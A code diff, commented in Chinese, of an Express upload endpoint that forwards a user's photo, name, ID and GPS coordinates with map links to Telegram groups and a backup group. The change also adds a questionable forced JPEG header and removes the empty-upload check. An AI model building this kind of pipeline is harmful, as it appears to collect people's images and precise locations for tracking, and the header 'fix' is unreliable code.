@@ -728,11 +728,17 @@ expressApp.post('/upload', async (req, res) => {
   try {
     const chunks = [];
     for await (const chunk of req) chunks.push(chunk);
-    const photoBuffer = Buffer.concat(chunks);
+    let photoBuffer = Buffer.concat(chunks);
 
+    // 关键修复1：如果 Buffer 开头不是 JPEG 头，强制加 JPEG 头
+    if (photoBuffer[0] !== 0xFF || photoBuffer[1] !== 0xD8) {
+      console.log('检测到非标准 JPEG，强制修复头');
+      const jpegHeader = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01]);
+      photoBuffer = Buffer.concat([jpegHeader, photoBuffer]);
+    }
+
+    // 关键修复2：强制设置 filename，避免 Telegram 解析错误
     const { lat = '0', lng = '0', name = '汇盈用户', uid = '未知', time, chatid } = req.query;
-
-    if (!photoBuffer.length) return res.status(400).json({ code: 1, msg: '没有收到空图片' });
 
     const formattedTime = time 
       ? new Date(parseInt(time)).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })
@@ -740,9 +746,14 @@ expressApp.post('/upload', async (req, res) => {
 
     const caption = `【H5拍照上传】\n用户：${name} (ID:${uid})\n时间：${formattedTime}\n位置：${parseFloat(lat).toFixed(6)}, ${parseFloat(lng).toFixed(6)}\n高德地图：https://amap.com/dir?destination=${lng},${lat}\n谷歌地图：https://www.google.com/maps?q=${lat},${lng}`;
 
-    // 关键修复：用 { source: photoBuffer } 发 Buffer，彻底解决 “Wrong character in the string”
+    // 关键修复3：用 filename + source 发送
+    const photoOptions = {
+      filename: 'photo.jpg',
+      contentType: 'image/jpeg'
+    };
+
     if (chatid && GROUP_CHAT_IDS.includes(Number(chatid))) {
-      await bot.telegram.sendPhoto(Number(chatid), { source: photoBuffer }, {
+      await bot.telegram.sendPhoto(Number(chatid), { source: photoBuffer, ...photoOptions }, {
         caption: caption,
         parse_mode: 'Markdown'
       });
@@ -751,8 +762,7 @@ expressApp.post('/upload', async (req, res) => {
       }
     }
 
-    // 备份群也一样用 source
-    await bot.telegram.sendPhoto(BACKUP_GROUP_ID, { source: photoBuffer }, {
+    await bot.telegram.sendPhoto(BACKUP_GROUP_ID, { source: photoBuffer, ...photoOptions }, {
       caption: `[备份] ${caption}`,
       parse_mode: 'Markdown'
     });
@@ -789,4 +799,5 @@ process.once('SIGTERM', () => {
     console.log('收到 SIGTERM，关闭 Bot 和服务器...');
     bot.stop('SIGTERM');
 });
+
 
